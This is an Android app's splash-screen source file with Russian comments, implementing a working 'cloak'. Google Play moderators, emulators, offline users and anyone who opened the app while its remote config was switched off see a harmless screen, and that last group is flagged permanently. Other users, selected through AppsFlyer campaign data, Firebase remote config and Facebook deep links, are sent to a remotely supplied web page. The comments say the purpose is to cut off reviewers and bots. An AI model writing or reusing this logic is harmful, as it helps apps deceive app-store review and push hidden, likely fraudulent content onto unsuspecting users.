package com.pyramidzzzbook.activities;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AFLogger;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.pyramidzzzbook.MainActivity;
import com.pyramidzzzbook.R;
import com.facebook.applinks.AppLinkData;
import com.google.firebase.FirebaseApp;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import org.apache.commons.lang3.StringUtils;

import java.util.Map;
import java.util.Objects;

import static com.pyramidzzzbook.GlobalClass.AF_DEV_KEY;
import static com.pyramidzzzbook.GlobalClass.REMOTE_KEY;
import static com.pyramidzzzbook.GlobalClass.campaign;
import static com.pyramidzzzbook.GlobalClass.dataSource;
import static com.pyramidzzzbook.GlobalClass.remoteResponse;
import static com.pyramidzzzbook.GlobalClass.sharedPrefsHelper;
import static com.pyramidzzzbook.GlobalClass.sub1;
import static com.pyramidzzzbook.GlobalClass.sub10;
import static com.pyramidzzzbook.GlobalClass.sub2;
import static com.pyramidzzzbook.GlobalClass.sub3;
import static com.pyramidzzzbook.GlobalClass.sub4;
import static com.pyramidzzzbook.GlobalClass.sub5;
import static com.pyramidzzzbook.GlobalClass.sub9;

public class SplashActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);


        //проверяем на успешность получения ремоут конфига во время проверки в гугл плей
        //если не прошёл ранее, то отсекам напрочь возможность этим пользователям в дальнейшем зайти на webview
        if (sharedPrefsHelper.getConfigNotPassed()){
            Log.d("testing", "configureNotPassed (1 step)");
            //если true ->
            //кидаем на клоаку
            getCloak();
        }
        //если нет ->
        else {
            Log.d("testing", "configurePassed (1 step)");
            //дальнейший блок проверок
            //проверяем, есть ли интернет
            if(!dataSource.isNetworkAvailable()){
                Log.d("testing", "non-Network (2 step)");
                //если true ->
                //кидаем на клоаку
                getCloak();
            }
            //если нет ->
            else {
                Log.d("testing", "non-Network passed (2 step)");
                //дальнейший блок проверок
                //проверка на виртуальное устройство (отсекаем модераторов по AVD)
                if (dataSource.checkOnGeneric()){
                    Log.d("testing", "Generic not passed (3 step)");
                    //если true (скорее всего модер) ->
                    //кидаем на клоаку
                    getCloak();
                }
                //если нет ->
                else {
                    Log.d("testing", "Generic passed (3 step)");
                    //дальнейший блок проверок//
                    //проверяем на первый запуск
                    if(!sharedPrefsHelper.getFirstLaunch()){
                        Log.d("testing", "First launch passed (4 step)");
                        //если да (первый запуск) ->
                        //получааем имя кампании и сеттим его в глобальную переменную *campaign*
                        getCampaignName();

                    }
                    //если нет (повторный запуск) ->
                    else {
                        Log.d("testing", "First launch not passed (4 step)");
                        //присваиваем глобальной переменной значение кампании (CampaignName|#|sub1=acc|#|sub2=buyer|#|sub3=promo|#|sub4=otherparam)
                        setCampaignToGlobalVar();

                        //отдаём методу имя кампании, присваиваем глобальным переменным (sub1, sub2...) значения, полученные из общего имя кампании и разделённых на части конкатом слов
                        setSubsToVars(campaign);

                        //получаем рекламный идентификатор (опционально)
                        dataSource.getID();

                        //стартуем веб
                        getWeb();
                    }
                }
            }


        }

    }


    //стартуем веб активити
    public void getWeb(){
        startActivity(new Intent(SplashActivity.this, WebActivity.class));
    }

    //вытаскиваем имя кампании с префов и присваиваем его глобальной переменной
    private void setCampaignToGlobalVar(){
        campaign = sharedPrefsHelper.getCampaign();
    }


    //конкатинируем имя кампании и разбиваем его на сабки
    private void setSubsToVars(String string){
        /* пример работы конката */

        //CampaignName|||sub1=param1|||sub2=param2|||sub3=param3|||sub4=param4
        //https://tracklink/sfsdgsg?sub1=acc &sub2=buyer &sub3=promo &sub4=otherparam &sub5=test &sub6=com.app.good &sub71415211453000-6513894 &sub8=9c9a82fb-d5de-4cd1-90c3-527441c11828

        //substringBetween(string, "sub1=", "|#|sub2");
        //вкладываем string (то есть имя кампании) и вырезаем символы между двух контрольных точек (в нашем случае sub1= и |#|sub2)
        sub1 =  StringUtils.substringBetween(string, "sub1=", "|||sub2");
        sub2 = StringUtils.substringBetween(string, "sub2=", "|||sub3");
        sub3 = StringUtils.substringBetween(string, "sub3=", "|||sub4");
        sub4 = StringUtils.substringAfter(string, "|||sub4=");

        //проверяем, есть ли сохранённые значения сабок с фб
        if (sharedPrefsHelper.ifContains()){
            //если да - вытаскиваем сабки
            sub5 = sharedPrefsHelper.getSub5();
            sub9 = sharedPrefsHelper.getSub9();
            sub10 = sharedPrefsHelper.getSub10();
        }

    }

    //кидаем на клоаку
    private void getCloak(){
        startActivity(new Intent(SplashActivity.this, MainActivity.class));
    }


    //получаем имя кампании (метод вызывается только один раз при первом запуске)
    private void getCampaignName() {
        AppsFlyerConversionListener conversionListener = new AppsFlyerConversionListener() {
            //этот метод вызывается в случае успешного получения данных (он отдаёт json объект, из которого мы можем вытаскивать параметры через метод .getKey())
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                //выводим все аттрибуции в лог
                for (String attrName : conversionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + conversionData.get(attrName));
                }

                //отлавливаем IO и NullPointer
                try{
                    Log.d("testing", Objects.requireNonNull(conversionData.get("campaign")).toString() + " by conversionData");
                    //заносим значение кампании в префы
                    sharedPrefsHelper.setCampaignName(Objects.requireNonNull(conversionData.get("campaign")).toString());
                    //получаем ремоут-конфиг, в метод прокидываем имя ключа, по которому отдаётся значение (то есть первая ссылка), присваиваем переменной remoteResponse - ссылку
                    if(sharedPrefsHelper.getFirstLaunchRemote()){

                    } else {
                        getRemoteConfig(REMOTE_KEY);
                        sharedPrefsHelper.setFirstLaunchRemote();
                    }
                } catch (NullPointerException e){
                    //получаем ремоут-конфиг, в метод прокидываем имя ключа, по которому отдаётся значение (то есть первая ссылка), присваиваем переменной remoteResponse - ссылку
                    if(sharedPrefsHelper.getFirstLaunchRemote()){

                    } else {
                        getRemoteConfig(REMOTE_KEY);
                        sharedPrefsHelper.setFirstLaunchRemote();
                    }
                }
            }

            //обрабатываем ошибку получения аттрибуций
            @Override
            public void onConversionDataFail(String errorMessage) {
                Log.d("LOG_TAG", "error getting conversion data: " + errorMessage);
            }

            //в случае если атррибуции поменяются, обрабатываем этот случай здесь
            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {

                for (String attrName : attributionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + attributionData.get(attrName));
                }
                Log.d("testing", attributionData.get("campaign") + " by attributionData");

                //заносим значение кампании в префы
                sharedPrefsHelper.setCampaignName(Objects.requireNonNull(attributionData.get("campaign")));

                //получаем ремоут-конфиг, в метод прокидываем имя ключа, по которому отдаётся значение (то есть первая ссылка), присваиваем переменной remoteResponse - ссылку
                getRemoteConfig(REMOTE_KEY);
            }

            //тотальная ошибка получения аттрибуций (обрабатываем в этом методе)
            @Override
            public void onAttributionFailure(String errorMessage) {
                Log.d("LOG_TAG", "error onAttributionFailure : " + errorMessage);
            }
        };

        //устанавливаем логи на полном уровне (отображается почти всё)
        AppsFlyerLib.getInstance().setLogLevel(AFLogger.LogLevel.VERBOSE);
        //инициализируем клиент с ключём, который получаем на аппсфлаере
        AppsFlyerLib.getInstance().init(AF_DEV_KEY, conversionListener, this);
        //стартуем трекинг
        AppsFlyerLib.getInstance().startTracking(this);
    }


    //получаешь ремоут конфиг по ключу и присваиваешь его в глобальную переменную
    private void getRemoteConfig(String key){
        FirebaseApp.initializeApp(this);
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_defaults);
        mFirebaseRemoteConfig.fetch(0);
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, task -> {
                    //проверяем на успешность получения данных
                    if (task.isSuccessful()){
                        Log.d("testing", "remote.isSuccessful");
                        //если да //выполняем ->
                        remoteResponse = mFirebaseRemoteConfig.getString(key);
                        //проверяем конфиг (если пустой - кидаем на клоаку) (если нет - получаем дип)
                        if(!remoteResponse.equals("")){
                            Log.d("testing", "remote not equals '' ");
                            Log.d("testing", remoteResponse);
                            //сеттим проверочную ссылку в префы
                            sharedPrefsHelper.setResponse(remoteResponse);
                            //получаем дип линки и сеттим их в сабки
                            getFBDeepLink(this);
                        } else {
                            Log.d("testing", "remote empty");
                            //если пустой /выполняем ->
                            //устанавливаем флаг на то, что юзер не прошёл проверку в момент, когда конфиг был отключён
                            sharedPrefsHelper.setConfigNotPassed(true);
                            //таким образом мы отсекаем модеров и ботов, которые могли попасть сюда во время проверки приложения и будут пытаться попасть в дальнейшем
                            //перекидываем пользователя на клоаку ->
                            getCloak();
                        }
                        //если данные не были получены
                    } else {
                        Log.d("testing", "remote is not Successful");
                        //выполняем ->
                        //устанавливаем флаг на то, что юзер не прошёл проверку в момент, когда конфиг был отключён
                        sharedPrefsHelper.setConfigNotPassed(true);
                        //перекидываем пользователя на клоаку
                        getCloak();
                    }

                });
    }

    //получаем facebook deep
    public static void getFBDeepLink(Context context){
        AppLinkData.fetchDeferredAppLinkData(context,
                appLinkData -> {
                    //если дипа нету или в него ничего не занесли
                    //выполняем ->
                    if (appLinkData == null || appLinkData.toString().equals("")){
                        Log.d("testing", "fb deep is empty");
                        //обрабатываем случай, когда не получили uri
                        //стартуем веб активити
                        Intent intent = new Intent(context, WebActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);

                    }
                    //если дип есть и он не пустой
                    //выполняем ->
                    else
                    {
                        Log.d("testing", "fb deep isn't empty");
                        //присваиваем глобальной переменной сабку
                        try {
                            //тут можно получить необходимые параметры в случае, если будешь использовать фб
                            //получаем кастомную сабку
                            //таких может быть сколько угодно
                            sub5 = appLinkData.getTargetUri().getQueryParameter("sub5");
                            sub9 = appLinkData.getTargetUri().getQueryParameter("sub9");
                            sub10 = appLinkData.getTargetUri().getQueryParameter("sub10");

                            //сохраняем сабки в хранилище
                            sharedPrefsHelper.setSub5(sub5);
                            sharedPrefsHelper.setSub9(sub9);
                            sharedPrefsHelper.setSub10(sub10);

                          /*
                          //** не забудь объявить эти сабки в глобальном классе, если будешь их использовать
                            sub1 = appLinkData.getTargetUri().getQueryParameter("sub1");
                            sub2 = appLinkData.getTargetUri().getQueryParameter("sub2");
                            sub3 = appLinkData.getTargetUri().getQueryParameter("sub2");
                           */
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        //стартуем веб активити
                        Intent intent = new Intent(context, WebActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    }

                }
        );
    }




}